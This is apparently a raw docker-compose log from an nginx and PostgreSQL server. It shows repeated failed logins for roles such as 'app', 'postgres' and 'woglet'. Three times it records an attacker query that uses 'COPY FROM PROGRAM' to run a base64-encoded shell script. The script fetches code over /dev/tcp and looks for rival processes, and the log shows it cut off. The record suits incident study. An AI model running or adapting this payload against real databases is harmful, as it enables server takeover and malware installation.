nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
db-1     | 2026-06-20 20:48:47.944 UTC [1072] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:50:09.498 UTC [1073] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:50:09.498 UTC [1073] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:51:41.659 UTC [1074] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:51:41.659 UTC [1074] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:53:13.961 UTC [1075] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:53:13.961 UTC [1075] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:54:45.466 UTC [1076] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:54:45.466 UTC [1076] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:55:43.083 UTC [1077] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:55:43.083 UTC [1077] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:55:53.780 UTC [1078] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:55:53.780 UTC [1078] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:56:17.406 UTC [1079] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:56:17.406 UTC [1079] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:57:49.290 UTC [1080] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:57:49.290 UTC [1080] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:59:21.076 UTC [1081] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:59:21.076 UTC [1081] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:00:53.372 UTC [1082] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:00:53.372 UTC [1082] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:02:25.939 UTC [1084] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:02:25.939 UTC [1084] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:02:34.627 UTC [1083] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:02:34.627 UTC [1083] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:02:35.829 UTC [1085] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:02:35.829 UTC [1085] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:02:36.374 UTC [1086] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:02:36.374 UTC [1086] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:02:37.672 UTC [1087] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:02:37.672 UTC [1087] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:02:37.920 UTC [1088] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:02:37.920 UTC [1088] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:03:57.679 UTC [1089] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:03:57.679 UTC [1089] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:05:12.136 UTC [1090] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:05:12.136 UTC [1090] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:05:17.550 UTC [1091] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:05:17.550 UTC [1091] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:05:30.042 UTC [1092] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:05:30.042 UTC [1092] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:07:01.660 UTC [1093] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:07:01.660 UTC [1093] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:08:34.064 UTC [1094] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:08:34.064 UTC [1094] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:09:22.190 UTC [1095] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:09:22.190 UTC [1095] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:09:31.537 UTC [1096] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:09:31.537 UTC [1096] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:10:06.523 UTC [1097] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:10:06.523 UTC [1097] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:11:38.902 UTC [1098] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:11:38.902 UTC [1098] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:13:11.706 UTC [1099] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:13:11.706 UTC [1099] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:14:42.970 UTC [1101] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:14:42.970 UTC [1101] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:14:50.477 UTC [1100] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 21:14:50.477 UTC [1100] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:15:01.275 UTC [1102] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 21:15:01.275 UTC [1102] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:15:21.759 UTC [1] LOG:  server process (PID 1103) was terminated by signal 9: Killed
db-1     | 2026-06-20 21:15:21.759 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 21:15:21.760 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 21:15:21.763 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 21:15:21.801 UTC [1105] LOG:  database system was interrupted; last known up at 2026-06-20 20:41:02 UTC
db-1     | 2026-06-20 21:15:21.876 UTC [1105] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 21:15:21.881 UTC [1105] LOG:  redo starts at 0/1BD8170
db-1     | 2026-06-20 21:15:21.881 UTC [1105] LOG:  invalid record length at 0/1BD81A8: expected at least 24, got 0
db-1     | 2026-06-20 21:15:21.881 UTC [1105] LOG:  redo done at 0/1BD8170 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 21:15:21.888 UTC [1106] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 21:15:21.912 UTC [1106] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.007 s, sync=0.003 s, total=0.028 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1BD81A8, redo lsn=0/1BD81A8
db-1     | 2026-06-20 21:15:21.920 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 21:16:03.175 UTC [1111] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:16:03.175 UTC [1111] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:16:06.236 UTC [1112] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 21:16:06.236 UTC [1112] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:16:14.984 UTC [1113] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:16:14.984 UTC [1113] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:17:46.586 UTC [1114] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:17:46.586 UTC [1114] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:19:17.771 UTC [1115] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:19:17.771 UTC [1115] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:20:49.767 UTC [1116] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:20:49.767 UTC [1116] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:22:20.761 UTC [1117] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:22:20.761 UTC [1117] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:22:33.282 UTC [1118] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 21:22:33.282 UTC [1118] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:22:47.856 UTC [1119] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 21:22:47.856 UTC [1119] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:23:15.016 UTC [1] LOG:  server process (PID 1120) was terminated by signal 9: Killed
db-1     | 2026-06-20 21:23:15.016 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 21:23:15.017 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 21:23:15.020 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 21:23:15.056 UTC [1125] LOG:  database system was interrupted; last known up at 2026-06-20 21:15:21 UTC
db-1     | 2026-06-20 21:23:15.137 UTC [1125] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 21:23:15.142 UTC [1125] LOG:  redo starts at 0/1BD8220
db-1     | 2026-06-20 21:23:15.144 UTC [1125] LOG:  invalid magic number 0000 in WAL segment 000000010000000000000001, LSN 0/1BF4000, offset 12533760
db-1     | 2026-06-20 21:23:15.144 UTC [1125] LOG:  redo done at 0/1BF1518 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 21:23:15.152 UTC [1126] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 21:23:15.178 UTC [1126] LOG:  checkpoint complete: wrote 28 buffers (0.2%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.006 s, sync=0.009 s, total=0.030 s; sync files=25, longest=0.005 s, average=0.001 s; distance=111 kB, estimate=111 kB; lsn=0/1BF4048, redo lsn=0/1BF4048
db-1     | 2026-06-20 21:23:15.185 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 21:23:52.328 UTC [1131] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:23:52.328 UTC [1131] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:25:24.188 UTC [1132] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:25:24.188 UTC [1132] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:26:55.717 UTC [1133] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:26:55.717 UTC [1133] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:28:50.352 UTC [1134] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 21:28:50.352 UTC [1134] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:29:17.429 UTC [1135] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 21:29:17.429 UTC [1135] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:29:18.061 UTC [1136] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 21:29:18.061 UTC [1136] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 21:29:30.220 UTC [1] LOG:  server process (PID 1137) was terminated by signal 9: Killed
db-1     | 2026-06-20 21:29:30.220 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 21:29:30.221 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 21:29:30.225 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 21:29:30.261 UTC [1139] LOG:  database system was interrupted; last known up at 2026-06-20 21:23:15 UTC
db-1     | 2026-06-20 21:29:30.350 UTC [1139] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 21:29:30.356 UTC [1139] LOG:  redo starts at 0/1BF40C0
db-1     | 2026-06-20 21:29:30.356 UTC [1139] LOG:  invalid record length at 0/1BF40F8: expected at least 24, got 0
db-1     | 2026-06-20 21:29:30.356 UTC [1139] LOG:  redo done at 0/1BF40C0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 21:29:30.363 UTC [1140] LOG:  checkpoint starting: end-of-recovery immediate wait
